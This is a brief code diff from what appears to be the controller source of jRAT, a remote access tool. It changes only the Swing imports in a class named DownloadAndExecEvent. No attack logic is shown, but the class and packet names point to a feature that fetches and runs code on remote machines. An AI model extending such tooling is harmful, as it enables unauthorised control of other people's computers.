@@ -7,8 +7,7 @@ import jrat.controller.packets.outgoing.Packet17DownloadExecute;
 import jrat.controller.utils.NetUtils;
 import jrat.controller.utils.Utils;
 
-import javax.swing.ImageIcon;
-import javax.swing.JOptionPane;
+import javax.swing.*;
 
 
 public class DownloadAndExecEvent extends Event {
